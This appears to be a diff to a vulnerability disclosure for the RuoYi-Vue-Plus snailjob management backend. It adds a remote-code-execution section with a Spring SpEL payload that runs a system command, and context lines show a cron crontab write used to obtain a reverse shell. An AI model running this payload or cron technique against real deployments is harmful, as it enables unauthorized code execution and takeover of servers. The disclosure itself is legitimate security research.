@@ -1,4 +1,4 @@
-# The Ruoyi-vue-plus snailjob component management backend contains arbitrary file writes/reads.
+# The Ruoyi-vue-plus snailjob component management backend contains arbitrary file writes/reads and RCE.
 ## Address
 https://gitee.com/dromara/RuoYi-Vue-Plus
 ## Code audit:
@@ -90,3 +90,10 @@ file = new java.io.File (\"/var/spool/ cron /crontabs/root\"); readableSet = fil
 Rebound shell successfully
 
 <img width="1233" height="737" alt="image" src="https://github.com/user-attachments/assets/64188e7f-7662-4224-a05b-9f1f79e9faed" />
+
+### RCE
+payload
+```java
+new org.springframework.expression.spel.standard.SpelExpressionParser().parseExpression("T(java.lang.Runtime).getRuntime().exec('calc')").getValue();
+```
+<img width="1873" height="844" alt="image" src="https://github.com/user-attachments/assets/b05df5cd-a40e-444f-8e17-99a9737a07af" />
